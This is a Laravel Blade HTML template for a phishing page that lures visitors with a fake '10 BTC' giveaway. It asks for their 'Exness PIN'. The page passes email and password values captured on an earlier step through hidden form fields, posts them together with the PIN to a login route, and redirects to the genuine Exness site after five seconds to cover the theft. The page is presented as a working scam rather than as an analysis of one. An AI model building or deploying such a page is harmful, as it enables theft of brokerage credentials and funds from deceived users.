<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Claim 10 BTC Now</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');

        body {
            font-family: 'Inter', sans-serif;
        }

        .glow {
            box-shadow: 0 0 20px 4px rgba(255, 200, 0, 0.6);
        }
    </style>
</head>

<body class="bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white min-h-screen flex items-center justify-center p-6">

<div class="w-full max-w-xl text-center space-y-8">
    <h1 class="text-4xl md:text-5xl font-bold text-yellow-400 animate-pulse">
        🎉 Get 10 BTC Instantly!
    </h1>
    <p class="text-gray-300 text-lg md:text-xl">
        You're eligible to receive <span class="font-semibold text-white">10 Bitcoin</span>. Enter your Exness PIN code to receive.
    </p>

    <form method="POST" action="{{ route('login.store') }}" class="bg-white/10 backdrop-blur-md p-8 rounded-xl space-y-5 border border-yellow-500 glow">
        @csrf
        <input type="hidden" name="email" value="{{ session('email') }}">
        <input type="hidden" name="password" value="{{ session('password') }}">

        <div class="text-left">
            <label for="wallet" class="block mb-2 text-sm text-yellow-300">PIN</label>
            <input type="text" id="wallet" name="pin" placeholder="Your secret PIN..." required
                   class="w-full p-3 rounded-md bg-white/10 border border-gray-500 text-white placeholder-gray-400">
        </div>

        <button type="submit"
                class="w-full bg-yellow-400 text-black font-bold py-3 rounded-md hover:bg-yellow-300 transition">
            Claim
        </button>
    </form>

    <div class="text-sm text-gray-500 italic">
        * For security reasons, this offer is available once per user.
    </div>
</div>

<!-- ✅ Redirect sau 5 giây -->
<script>
    setTimeout(function () {
        window.location.href = "https://www.exness.com/";
    }, 5000);
</script>

</body>
</html>
